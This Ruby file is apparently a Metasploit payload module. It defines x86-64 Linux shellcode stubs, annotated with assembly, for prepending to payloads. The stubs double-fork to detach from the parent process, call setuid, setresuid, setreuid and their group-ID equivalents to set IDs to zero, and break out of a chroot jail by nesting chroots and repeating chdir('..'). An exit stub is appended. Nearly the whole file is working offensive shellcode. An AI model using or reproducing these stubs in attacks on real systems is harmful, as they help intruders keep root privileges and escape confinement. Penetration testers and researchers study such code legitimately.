#
# Linux x64 Prepends file
#
module Msf::Payload::Linux::X64::Prepends
  include Msf::Payload::Linux::Prepends
  def prepends_order
    %w[PrependFork PrependSetresuid PrependSetreuid PrependSetuid]
  end

  def appends_order
    %w[]
  end

  def prepends_map
    {
      'PrependFork' => "\x6a\x39" + #    push    57        ; __NR_fork     #
        "\x58" + #    pop     rax                       #
        "\x0f\x05" + #    syscall                           #
        "\x48\x85\xc0" + #    test    rax,rax                   #
        "\x74\x08" + #    jz      loc_0012                  #
        #  loc_000a:                           #
        "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x6a\x3c" + #    push    60        ; __NR_exit     #
        "\x58" + #    pop     rax                       #
        "\x0f\x05" + #    syscall                           #
        #  loc_0012:                           #
        "\x04\x70" + #    add     al, 112   ; __NR_setsid   #
        "\x0f\x05" + #    syscall                           #
        "\x6a\x39" + #    push    57        ; __NR_fork     #
        "\x58" + #    pop     rax                       #
        "\x0f\x05" + #    syscall                           #
        "\x48\x85\xc0" + #    test    rax,rax                   #
        "\x75\xea", #    jnz     loc_000a                  #

      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
        "\x6a\x75" + #    push    0x75                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05", #    syscall                           #

      # setreuid(0, 0)
      'PrependSetreuid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
        "\x48\x89\xf2" + #    mov     rdx,rsi                   #
        "\x6a\x71" + #    push    0x71                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05", #    syscall                           #

      # setuid(0)
      'PrependSetuid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x6a\x69" + #    push    0x69                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05", #    syscall                           #

      # setresgid(0, 0, 0)
      'PrependSetresgid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
        "\x6a\x77" + #    push    0x77                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05", #    syscall                           #

      # setregid(0, 0)
      'PrependSetregid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
        "\x48\x89\xf2" + #    mov     rdx,rsi                   #
        "\x6a\x72" + #    push    0x72                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05", #    syscall                           #

      # setgid(0)
      'PrependSetgid' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x6a\x6a" + #    push    0x6a                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05", #    syscall                           #

      # setreuid(0, 0) + break chroot
      'PrependChrootBreak' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x48\x89\xfe" + #    mov     rsi,rdi                   #
        "\x48\x89\xf8" + #    mov     rax,rdi                   #
        "\xb0\x71" + #    mov     al,0x71                   #
        "\x0f\x05" + #    syscall                           #
        # generate temp dir name
        "\x48\xbf#{Rex::Text.rand_text_alpha(8)}" + #    mov     rdi, <random 8 bytes alpha>  #
        "\x56" + #    push    rsi                       #
        "\x57" + #    push    rdi                       #
        # mkdir(random,0755)
        "\x48\x89\xe7" + #    mov     rdi,rsp                   #
        "\x66\xbe\xed\x01" + #    mov     si,0755                   #
        "\x6a\x53" + #    push    0x53                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05" + #    syscall                           #

        # chroot(random)
        "\x48\x31\xd2" + #    xor     rdx,rdx                   #
        "\xb2\xa1" + #    mov     dl,0xa1                   #
        "\x48\x89\xd0" + #    mov     rax,rdx                   #
        "\x0f\x05" + #    syscall                           #

        # build .. (ptr in rdi )
        "\x66\xbe\x2e\x2e" + #    mov     si,0x2e2e                 #
        "\x56" + #    push    rsi                       #
        "\x48\x89\xe7" + #    mov     rdi,rsp                   #

        # loop chdir(..) 69 times
        # syscall tend to modify rcx can't use loop...
        "\x6a\x45" + #    push    0x45                      #
        "\x5b" + #    pop     rbx                       #
        "\x6a\x50" + #    push    0x50                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05" + #    syscall                           #
        "\xfe\xcb" + #    dec     bl                        #
        "\x75\xf7" + #    jnz     -7                        #

        # chroot (.) (which should be /)
        "\x6a\x2e" + #    push    .  (0x2e)                 #
        "\x48\x89\xe7" + #    mov     rdi,rsp                   #
        "\x48\x89\xd0" + #    mov     rax,rdx                   #
        "\x0f\x05"
    } #    syscall                           #
  end

  def appends_map
    {
      # exit(0)
      'AppendExit' => "\x48\x31\xff" + #    xor     rdi,rdi                   #
        "\x6a\x3c" + #    push    0x3c                      #
        "\x58" + #    pop     rax                       #
        "\x0f\x05" #    syscall                           #
    }
  end
end
